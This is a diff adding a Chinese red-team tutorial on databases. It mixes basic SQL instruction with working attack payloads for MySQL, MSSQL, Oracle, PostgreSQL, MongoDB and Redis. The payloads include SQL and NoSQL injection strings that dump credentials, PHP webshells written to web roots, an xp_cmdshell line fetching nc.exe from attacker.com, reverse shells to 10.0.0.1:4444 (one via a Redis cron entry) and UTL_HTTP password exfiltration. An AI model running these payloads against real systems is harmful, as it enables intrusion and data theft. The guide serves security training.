@@ -1,0 +1,671 @@
+================================================================================
+                          数据库基础
+            网安基础知识系列 · 红队入门必读
+================================================================================
+
+【目录】
+  一、数据库概述
+  二、关系型数据库 - SQL基础
+  三、MySQL详解
+  四、MSSQL详解
+  五、Oracle详解
+  六、PostgreSQL详解
+  七、NoSQL数据库
+  八、SQLite
+  九、数据库连接字符串
+  十、红队视角总结
+
+================================================================================
+一、数据库概述
+================================================================================
+
+数据库是红队渗透的常见目标，因为：
+  1. 存储着核心业务数据(用户信息、财务数据、机密信息)
+  2. 常用于存储认证凭证(如果能访问数据库，通常就能获取大量凭证)
+  3. Web应用漏洞的最终目标和数据源 (SQL注入!)
+  4. 后渗透中提取数据的主要来源
+  5. 存储过程/函数可能被滥用于命令执行
+
+常见数据库类型：
+  关系型: MySQL, PostgreSQL, MSSQL, Oracle, MariaDB, SQLite
+  NoSQL:  MongoDB, Redis, Elasticsearch, Cassandra, CouchDB
+  内存型: Memcached, Redis
+  图数据库: Neo4j
+  列式: HBase, ClickHouse
+
+================================================================================
+二、关系型数据库 - SQL基础
+================================================================================
+
+【数据库核心概念】
+
+  数据库(Database):     容器，包含多个表
+  表(Table):            数据的逻辑组织，行与列组成
+  列(Column):           数据的属性(字段)
+  行(Row):              一条记录
+  主键(Primary Key):    唯一标识每行的列
+  外键(Foreign Key):    关联其他表的列
+  索引(Index):          加速查询的数据结构
+  视图(View):           存储的查询结果(虚拟表)
+  存储过程(Procedure):  预编译的SQL代码块
+  触发器(Trigger):      自动执行的SQL代码(在特定条件触发)
+
+【SQL基础语句】
+
+  -- 查询数据 (DQL - Data Query Language)
+  SELECT column1, column2 FROM table_name;
+  SELECT * FROM users;
+  SELECT DISTINCT department FROM employees;
+  SELECT * FROM users WHERE id = 1;
+  SELECT * FROM users WHERE name LIKE 'A%';
+  SELECT * FROM orders WHERE amount BETWEEN 100 AND 500;
+  SELECT * FROM users WHERE id IN (1, 2, 3);
+  SELECT * FROM products ORDER BY price DESC;
+  SELECT category, COUNT(*) FROM products GROUP BY category;
+  SELECT category, COUNT(*) FROM products GROUP BY category HAVING COUNT(*) > 5;
+  SELECT * FROM users LIMIT 10 OFFSET 20;
+
+  -- 插入数据 (DML)
+  INSERT INTO users (name, email) VALUES ('Alice', 'alice@mail.com');
+  INSERT INTO users (name, email) VALUES ('Bob', 'bob@mail.com'), ('Charlie', 'charlie@mail.com');
+
+  -- 更新数据 (DML)
+  UPDATE users SET email = 'new@mail.com' WHERE id = 1;
+  UPDATE users SET status = 'active' WHERE last_login > '2024-01-01';
+
+  -- 删除数据 (DML)
+  DELETE FROM users WHERE id = 5;
+  DELETE FROM logs WHERE created_at < '2023-01-01';  -- 清空旧日志
+  TRUNCATE TABLE temp_data;  -- 清空整表(DDL,更快)
+
+  -- 表管理 (DDL - Data Definition Language)
+  CREATE TABLE users (
+      id INT AUTO_INCREMENT PRIMARY KEY,
+      username VARCHAR(50) NOT NULL UNIQUE,
+      password VARCHAR(255) NOT NULL,
+      email VARCHAR(100),
+      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+  );
+  ALTER TABLE users ADD COLUMN phone VARCHAR(20);
+  ALTER TABLE users DROP COLUMN phone;
+  ALTER TABLE users MODIFY COLUMN email VARCHAR(200);
+  DROP TABLE old_table;
+
+【UNION联合查询 - SQL注入关键】
+
+  SELECT name, email FROM users
+  UNION
+  SELECT title, description FROM products;
+
+  使用UNION的条件:
+    1. 两个SELECT的列数必须相同
+    2. 对应列的数据类型兼容
+    3. ORDER BY只能出现在最后一个SELECT
+
+  SQL注入中的UNION:
+    1. 先用 ORDER BY 1,2,3... 确定列数
+    2. 然后用 UNION SELECT 1,2,3... 确定显示位
+    3. 最后替换显示位为需要的数据
+
+    -- 确定列数
+    ?id=1 ORDER BY 3 -- (正常) -> 至少3列
+    ?id=1 ORDER BY 4 -- (报错) -> 总共3列
+
+    -- 确定显示位
+    ?id=-1 UNION SELECT 1,2,3 --
+
+    -- 提取数据
+    ?id=-1 UNION SELECT 1,database(),3 --          # 数据库名
+    ?id=-1 UNION SELECT 1,version(),3 --           # 版本
+    ?id=-1 UNION SELECT 1,user(),3 --              # 当前用户
+    ?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() --
+    ?id=-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users' --
+    ?id=-1 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users --
+
+【JOIN 表连接】
+
+  -- INNER JOIN (交集)
+  SELECT u.name, o.order_date
+  FROM users u
+  INNER JOIN orders o ON u.id = o.user_id;
+
+  -- LEFT JOIN (左表全部，右表匹配不到的为NULL)
+  SELECT u.name, o.order_date
+  FROM users u
+  LEFT JOIN orders o ON u.id = o.user_id;
+
+  -- RIGHT JOIN (右表全部)
+  -- FULL OUTER JOIN (MYSQL不支持，可用UNION模拟)
+
+【函数和运算符】
+
+  字符串函数:
+    CONCAT('a', 'b', 'c')        -- 'abc'
+    GROUP_CONCAT(column)          -- 将多行合并成一行字符串(SQL注入必用!)
+    SUBSTRING('hello', 2, 3)      -- 'ell'
+    LENGTH('hello')               -- 5
+    UPPER('hello')                -- 'HELLO'
+
+  聚合函数:
+    COUNT(*)                      -- 行数
+    SUM(amount)                   -- 总和
+    AVG(price)                    -- 平均值
+    MAX(price) / MIN(price)       -- 最大/最小值
+
+  运算符:
+    UNION, AND, OR, NOT
+    LIKE, BETWEEN, IN, EXISTS
+    =, <>, !=, >, <, >=, <=
+
+【注释(用于SQL注入Payload)】
+  -- 单行注释(注意后面需要空格): 1' --
+  # 单行注释(MySQL): 1' #
+  /* 多行注释 */: 1'/*comment*/
+
+================================================================================
+三、MySQL详解
+================================================================================
+
+MySQL是最常见的Web后端数据库(LAMP/LEMP栈)。
+
+【MySQL常见端口】：3306
+
+【MySQL客户端连接】
+  mysql -h 192.168.1.5 -u root -p
+  mysql -h 192.168.1.5 -u root -p < database.sql
+  mysql -h 192.168.1.5 -u root -p -e "SELECT version();"
+
+【MySQL系统数据库】
+  information_schema  - 元数据，包含所有数据库/表/列信息(SQL注入核心!)
+  mysql               - MySQL自身用户和权限数据
+  performance_schema  - 性能监控数据
+  sys                 - 系统对象(MySQL 5.7+)
+
+【information_schema 关键表】
+  information_schema.schemata          - 所有数据库
+  information_schema.tables            - 所有表
+  information_schema.columns           - 所有列
+  information_schema.processlist       - 当前连接
+
+  SQL注入常用查询:
+    SELECT schema_name FROM information_schema.schemata;
+    SELECT table_name FROM information_schema.tables WHERE table_schema='target_db';
+    SELECT column_name FROM information_schema.columns WHERE table_name='users';
+    SELECT concat(id,0x7c,username,0x7c,password) FROM users;
+
+【MySQL用户和权限】
+  mysql.user 表: 存储用户、密码哈希和全局权限
+
+  查看权限:
+    SELECT user, host, authentication_string FROM mysql.user;
+    SHOW GRANTS FOR 'root'@'localhost';
+
+  权限类型:
+    ALL PRIVILEGES, SELECT, INSERT, UPDATE, DELETE,
+    CREATE, DROP, FILE, SUPER, PROCESS, RELOAD
+
+  FILE权限(红队重点关注!):
+    允许读写文件系统
+    SELECT LOAD_FILE('/etc/passwd');       # 读文件(需要)
+
+   写入文件(写入WebShell!):
+    SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
+
+    写入文件的条件:
+      1. 用户有FILE权限
+      2. 目录全局可写(或MySQL有写权限)
+      3. 文件不存在(INTO OUTFILE不允许覆盖)
+      4. secure_file_priv为空(或包含目标目录)
+
+【MySQL安全配置检查】
+  secure_file_priv                     - 限制LOAD_FILE/INTO OUTFILE的目录
+    SHOW VARIABLES LIKE 'secure_file_priv';
+    空字符串 = 无限制; NULL = 禁用FILE; /var/some/ = 限制在此目录
+
+  skip-networking                      - 禁用TCP/IP(只用socket)防止远程连接
+  bind-address                         - 绑定网络接口
+
+【MySQL写WebShell (红队核心操作)】
+  1. 首先确认Web根目录位置
+     - 检查Apache/Nginx配置
+     - 常见: /var/www/html/, /var/www/, /opt/lampp/htdocs/
+     - 使用 load_file('/etc/apache2/sites-enabled/000-default.conf') 读配置
+
+  2. 写入Shell
+     SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
+
+  3. 如果FILE被限制，使用日志写入:
+     前提: 需要SUPER权限
+     SET GLOBAL general_log = ON;
+     SET GLOBAL general_log_file = '/var/www/html/shell.php';
+     SELECT '<?php system($_GET["cmd"]); ?>';
+
+  4. 访问 http://target/shell.php?cmd=id
+
+【MySQL UDF提权 (User Defined Function)】
+  用于在MySQL中以root权限执行系统命令。
+  步骤:
+    1. 检查plugin目录: SHOW VARIABLES LIKE 'plugin_dir';
+    2. 上传UDF DLL/so到plugin目录
+       - 使用 SELECT ... INTO DUMPFILE
+       - 或通过WebShell/其他方式上传
+    3. 创建函数: CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';
+    4. 执行命令: SELECT sys_eval('whoami');
+
+  常用UDF库: lib_mysqludf_sys.so (Linux), mysqludf.dll (Windows)
+  工具: raptor_udf2, sqlmap --os-shell
+
+================================================================================
+四、MSSQL详解
+================================================================================
+
+MSSQL (Microsoft SQL Server) 是企业环境中常见的关系型数据库，尤其
+在Windows域环境中。
+
+【MSSQL常见端口】：1433 (默认), 1434 (Browser Service UDP)
+
+【MSSQL连接方式】
+  sqlcmd -S 192.168.1.5 -U sa -P password
+  smbclient (impacket)
+  HeidiSQL, DBeaver, SSMS (GUI)
+  PowerUpSQL (PowerShell工具集)
+
+【MSSQL系统数据库】
+  master       - 包含所有数据库的元数据(最重要的数据库)
+  tempdb       - 临时对象
+  model        - 新数据库模板
+  msdb         - SQL Server Agent(计划任务)
+  tempdb       - 系统临时数据
+
+【MSSQL关键系统表】
+  master..sysdatabases      - 所有数据库
+  INFORMATION_SCHEMA.TABLES - 所有表
+  INFORMATION_SCHEMA.COLUMNS - 所有列
+
+【MSSQL用户和角色】
+  sa (System Administrator)     - 最强大的默认账户
+  sysadmin                       - 固定服务器角色，等同于完整管理员
+  db_owner                       - 数据库级所有者
+  public                         - 默认所有用户属于此角色
+
+  Login vs User区别:
+    Login(登录): 服务器级别的访问凭证
+    User(用户): 数据库级别的访问授权
+    一个Login可以映射到不同数据库的不同User
+
+【xp_cmdshell - MSSQL命令执行 (红队关键!)】
+
+  xp_cmdshell是MSSQL的扩展存储过程，允许以MSSQL服务账户身份执行系统命令。
+  默认禁用，但sysadmin角色可以启用。
+
+  启用 xp_cmdshell:
+    -- 在master数据库中
+    EXEC sp_configure 'show advanced options', 1;
+    RECONFIGURE;
+    EXEC sp_configure 'xp_cmdshell', 1;
+    RECONFIGURE;
+
+  执行命令:
+    EXEC xp_cmdshell 'whoami';
+    EXEC xp_cmdshell 'ipconfig /all';
+    EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://attacker.com/nc.exe -OutFile C:\temp\nc.exe"';
+    EXEC xp_cmdshell 'C:\temp\nc.exe 10.0.0.1 4444 -e cmd.exe';
+
+  如果 xp_cmdshell 被禁用/删除:
+    替代方法:
+      1. 使用 sp_OACreate (OLE Automation):
+         EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
+         DECLARE @shell INT;
+         EXEC sp_oacreate 'wscript.shell', @shell OUTPUT;
+         EXEC sp_oamethod @shell, 'run', NULL, 'cmd /c whoami';
+
+      2. 使用 CLR (Common Language Runtime) 程序集
+
+      3. 使用Bulk Insert读取本地文件(类似MySQL LOAD_FILE)
+
+      4. xp_dirtree (列举目录, 不需要启用):
+         EXEC xp_dirtree 'C:\', 1, 1;
+
+      5. xp_fileexist (检查文件是否存在):
+         EXEC xp_fileexist 'C:\Windows\System32\cmd.exe';
+
+【MSSQL链接服务器 (Linked Servers) - 横向移动】
+  MSSQL可以链接到其他数据库服务器，在链接服务器上执行查询。
+
+  发现链接服务器: SELECT * FROM sys.servers;
+
+  在链接服务器上执行查询(OPENQUERY):
+    SELECT * FROM OPENQUERY("LINKED_SERVER", 'SELECT * FROM master..sysdatabases');
+
+  执行命令(如果链接服务器也启用了xp_cmdshell):
+    SELECT * FROM OPENQUERY("LINKED_SERVER", 'EXEC xp_cmdshell ''whoami''');
+
+  PowerUpSQL自动化:
+    Get-SQLServerLinkCrawl -Instance SQL01 -Verbose
+
+【MSSQL注入绕过技巧】
+  1. 使用括号: SELECT * FROM users WHERE id=(1)UNION(SELECT 1)
+  2. 使用注释: SELECT/**/*/**/FROM/**/users
+  3. 编码: 使用CHAR()函数构造字符串
+     CHAR(83,69,76,69,67,84) = "SELECT"
+     EXEC(char(83)+char(69)+char(76)+char(69)+char(67)+char(84))
+  4. Union注入用NULL匹配数据类型:
+     UNION SELECT NULL,NULL,NULL--
+
+================================================================================
+五、Oracle详解
+================================================================================
+
+【Oracle常见端口】：1521 (默认), 2483/2484 (SSL)
+
+【Oracle连接】
+  sqlplus user/password@host:1521/SID
+  sqlplus system/manager@192.168.1.5:1521/ORCL
+
+【Oracle核心概念】
+  SID (System Identifier)    - 数据库实例标识
+  SERVICE_NAME               - 注册到监听器的服务名
+  Listener (监听器)           - 接收客户端连接请求
+  Tablespace (表空间)         - 逻辑存储单元
+  Schema (模式)               - 用户的逻辑数据集合
+  PL/SQL                     - Oracle的过程化SQL扩展
+
+【Oracle系统表】
+  ALL_TABLES                 - 当前用户可访问的所有表
+  USER_TABLES                - 当前用户拥有的表
+  ALL_TAB_COLUMNS            - 当前用户可访问的列
+  DBA_TABLES                 - 所有表(需要DBA权限)
+  V$VERSION                  - Oracle版本
+
+【Oracle默认用户和密码】
+  SYS / CHANGE_ON_INSTALL    - 最高权限(DBA)
+  SYSTEM / MANAGER           - 管理员
+  SCOTT / TIGER              - 示例用户
+  DBSNMP / DBSNMP            - Intelligent Agent
+  OUTLN / OUTLN              - Outline管理
+
+【Oracle命令执行 (红队核心)】
+
+  1. 利用 Java (Oracle自带JVM):
+    创建Java类执行系统命令
+
+  2. 利用 DBMS_XMLQUERY:
+    SELECT DBMS_XMLQUERY.GETXML('SELECT * FROM dual') FROM dual;
+    可用于UTL_HTTP请求(SSRF)
+
+  3. 利用 UTL_HTTP / UTL_TCP / UTL_SMTP:
+    这些包可用于网络通信，用于数据外传、SSRF、端口扫描
+    EXEC UTL_HTTP.REQUEST('http://10.0.0.1/exfil?data=' || (SELECT password FROM users WHERE rownum=1));
+
+  4. 利用外部表(Oracle 10g+)读写文件:
+    CREATE DIRECTORY ext_dir AS '/tmp';
+    -- 读取/etc/passwd作为表内容
+
+  5. 利用 DBMS_SCHEDULER:
+    BEGIN
+      DBMS_SCHEDULER.CREATE_JOB(
+        job_name => 'RCE_JOB',
+        job_type => 'EXECUTABLE',
+        job_action => '/bin/bash',
+        number_of_arguments => 2,
+        enabled => FALSE,
+        auto_drop => TRUE
+      );
+      DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('RCE_JOB', 1, '-c');
+      DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('RCE_JOB', 2, 'cmd');
+      DBMS_SCHEDULER.ENABLE('RCE_JOB');
+    END;
+
+  6. Orapki / ords攻击:
+    利用Oracle REST Data Services中间层
+
+【Oracle SQL注入特点】
+  - 需要FROM子句: SELECT 1 FROM dual (dual是默认的单行表)
+  - 不支持多行语句(不能使用;执行多个语句)
+  - UNION注入同样需要FROM dual
+  - 可以使用UTL_HTTP包在注入中做SSRF: /?id=1 UNION SELECT UTL_HTTP.REQUEST('http://attacker/'||password) FROM users--
+
+================================================================================
+六、PostgreSQL详解
+================================================================================
+
+【PostgreSQL常见端口】：5432
+
+【PostgreSQL连接】
+  psql -h 192.168.1.5 -U postgres -d database
+
+【PostgreSQL系统表】
+  pg_database               - 所有数据库
+  pg_tables                 - 所有表
+  information_schema.tables - SQL标准元数据
+  pg_stat_activity          - 当前活动连接
+  pg_shadow                 - 用户和密码哈希
+  pg_read_file / pg_ls_dir  - 文件读取/目录列举(需要pg_read_server_files)
+
+【PostgreSQL命令执行】
+
+  1. COPY PROGRAM (PostgreSQL 9.3+):
+    需要超级用户权限
+    CREATE TABLE cmd_output (output text);
+    COPY cmd_output FROM PROGRAM 'id';
+    SELECT * FROM cmd_output;
+
+  2. 利用 plpythonu / plperlu 等"不安全"过程语言:
+    CREATE EXTENSION plpythonu;
+    CREATE FUNCTION exec_cmd(cmd text) RETURNS text AS $$
+      import subprocess
+      return subprocess.check_output(cmd, shell=True)
+    $$ LANGUAGE plpythonu;
+    SELECT exec_cmd('id');
+
+  3. 利用 lo_export 写文件:
+    CREATE TABLE base64_file (data text);
+    COPY base64_file FROM PROGRAM 'base64 -w0 /etc/passwd';
+    SELECT lo_from_bytea(0, decode(data, 'base64')) FROM base64_file;
+    SELECT lo_export(oid, '/tmp/passwd_copy');
+
+  4. PostgreSQL Large Objects:
+    可用于上传/写入二进制文件到服务器
+    INSERT INTO pg_largeobject VALUES (0, 0, decode('encoded_data', 'base64'));
+
+【PostgreSQL SQL注入特点】
+  - 注释使用 -- (同MySQL)
+  - 字符串连接使用 || (而非MySQL的CONCAT)
+  - 比MySQL更接近SQL标准
+
+================================================================================
+七、NoSQL数据库
+================================================================================
+
+【MongoDB详解】
+
+  端口: 27017 (默认)
+
+  基本概念(与SQL对应):
+    Database -> Database
+    Table    -> Collection
+    Row      -> Document (BSON = Binary JSON)
+    Column   -> Field
+
+  MongoDB Shell基本命令:
+    show dbs;
+    use target_db;
+    show collections;
+    db.users.find();
+    db.users.find({username: "admin"});
+    db.users.findOne({username: "admin"});
+    db.users.insert({username: "attacker", password: "evil"});
+
+  未授权访问(红队高价值目标!):
+    默认配置下MongoDB监听0.0.0.0且不需要认证!
+    连接测试: mongo 192.168.1.5
+
+  MongoDB NoSQL注入:
+    利用$regex, $ne, $gt等操作符注入
+
+    正常请求: {"username": "admin", "password": "wrong"}
+    注入请求: {"username": "admin", "password": {"$ne": ""}}
+    含义: 密码不等于空 -> 认证绕过!
+
+    在HTTP请求中(如JSON参数):
+      ?username=admin&password[$ne]=
+      或
+      Content-Type: application/json
+      {"username": "admin", "password": {"$gt": ""}}
+
+    $regex注入提取数据:
+      {"username": "admin", "password": {"$regex": "^a"}}
+      如果返回成功，密码以a开头 -> 逐字符提取密码
+
+【Redis详解】
+
+  端口: 6379 (默认)
+
+  Redis数据类型:
+    STRING, LIST, SET, HASH, SORTED SET
+
+  Redis Shell基本命令:
+    SET key value
+    GET key
+    DEL key
+    FLUSHALL                     # 清空所有数据
+    INFO                         # 服务器信息
+    CONFIG GET *                 # 查看配置
+    CLIENT LIST                  # 连接列表
+    KEYS *                       # 列出所有键
+
+  未授权访问利用(红队高价值目标!):
+    默认情况下Redis无认证，直接连接:
+    redis-cli -h 192.168.1.5
+
+    写SSH公钥 (Linux):
+      redis-cli -h target
+      > CONFIG SET dir /root/.ssh/
+      > CONFIG SET dbfilename authorized_keys
+      > SET backdoor "\n\nssh-rsa AAAAB3N... attacker_key\n\n"
+      > SAVE
+
+    写WebShell:
+      > CONFIG SET dir /var/www/html/
+      > CONFIG SET dbfilename shell.php
+      > SET shell "<?php system($_GET['cmd']); ?>"
+      > SAVE
+
+    写计划任务(Crontab):
+      > CONFIG SET dir /var/spool/cron/
+      > CONFIG SET dbfilename root
+      > SET payload "\n* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'\n"
+      > SAVE
+
+    Windows主从复制RCE (通过加载恶意模块):
+      redis-cli -h target SLAVEOF attacker 6379
+      (攻击者运行恶意Redis主服务器，复制恶意模块)
+
+【Elasticsearch】
+
+  端口: 9200 (HTTP), 9300 (Transport)
+
+  未授权访问: curl http://192.168.1.5:9200/_cat/indices
+
+  Groovy脚本RCE (旧版本, 如CVE-2015-1427)
+
+================================================================================
+八、SQLite
+================================================================================
+
+SQLite是无服务器、零配置的文件型数据库。
+
+特点:
+  - 整个数据库是一个文件(如data.sqlite)
+  - 无需服务器进程
+  - 用于移动应用、浏览器存储、小型Web应用
+
+【发现和识别SQLite数据库】
+  find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null
+  或查看文件头: file database.db -> "SQLite 3.x database"
+
+【SQLite客户端】
+  sqlite3 database.db
+  .tables       # 列出所有表
+  .schema       # 显示建表语句
+  SELECT * FROM users;
+
+================================================================================
+九、数据库连接字符串
+================================================================================
+
+连接字符串是数据库的"门牌号"，包含服务器地址、端口、凭证等信息。
+
+【MySQL】
+  jdbc:mysql://host:3306/database?user=root&password=secret
+  mysql://user:password@host:3306/database
+
+【MSSQL】
+  jdbc:sqlserver://host:1433;databaseName=db;user=sa;password=secret
+  Server=host;Database=db;User Id=sa;Password=secret;
+  mssql://user:password@host:1433/db
+
+【PostgreSQL】
+  jdbc:postgresql://host:5432/database?user=postgres&password=secret
+  postgresql://user:password@host:5432/database
+
+【Oracle】
+  jdbc:oracle:thin:@host:1521:SID
+  Data Source=(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST=host)(PORT=1521))(CONNECT_DATA=(SID=sid)));User Id=user;Password=secret;
+
+【MongoDB】
+  mongodb://user:password@host:27017/database
+
+【Redis】
+  redis://user:password@host:6379/0
+
+【连接字符串发现(信息收集)】
+  常见位置:
+    - Web配置: web.config, app.config, .env, config.php, settings.py
+    - 应用文件: /var/www/html/wp-config.php (WordPress)
+                /opt/bitnami/apps/.../conf/
+    - 环境变量: printenv, /proc/PID/environ
+    - 版本控制: .git/config, git log -p
+    - 日志文件: 启动日志、错误日志中的连接字符串
+
+  红队搜索:
+    grep -r "jdbc:" /var/www/ 2>/dev/null
+    grep -r "connectionString\|Data Source=" /opt/ 2>/dev/null
+    grep -r "mysql://\|mongodb://\|postgresql://" /opt/ 2>/dev/null
+
+================================================================================
+十、红队视角总结
+================================================================================
+
+数据库是红队最重视的攻击目标之一，因为：
+  1. 存储用户名密码哈希、个人身份信息、商业机密
+  2. SQL注入是最常见的Web漏洞(OWASP Top 10 #3)
+  3. 数据库通常有命令执行能力(可升级到服务器控制)
+  4. 数据库常用于横向移动(链接服务器、凭证重用)
+
+核心攻击链条：
+  1. SQL注入 → 提取数据库凭证
+  2. WebShell上传 → 通过数据库FILE权限
+  3. UDF/存储过程 → 命令执行 → 服务器控制
+  4. 链接服务器 → 横向移动
+  5. NoSQL注入 → 认证绕过 → 数据窃取
+
+红队必须掌握的数据库操作：
+  - SQL基础: SELECT/INSERT/UPDATE/DELETE/UNION/JOIN/GROUP BY
+  - SQL注入: 盲注/报错注入/联合查询注入/时间注入
+  - 每种数据库: 连接方式、命令执行方式、系统信息查询方式
+  - NoSQL注入: MongoDB $regex/$ne绕过
+  - 文件读写: LOAD_FILE, INTO OUTFILE, xp_cmdshell, COPY PROGRAM
+  - 自动化: sqlmap, NoSQLMap
+
+速查 - 各数据库命令执行方式：
+  MySQL:   UDF, sys_exec(), INTO OUTFILE写WebShell, general_log
+  MSSQL:   xp_cmdshell, sp_OACreate, CLR
+  PostgreSQL: COPY PROGRAM, plpythonu, lo_export
+  Oracle:  DBMS_SCHEDULER, Java, UTL_TCP
+  Redis:   写SSH key/写Crontab/写WebShell/主从复制RCE
+  MongoDB: 无直接RCE，但可写WebShell(需要结合Web平台)
+
+================================================================================
+                        文档结束
+================================================================================
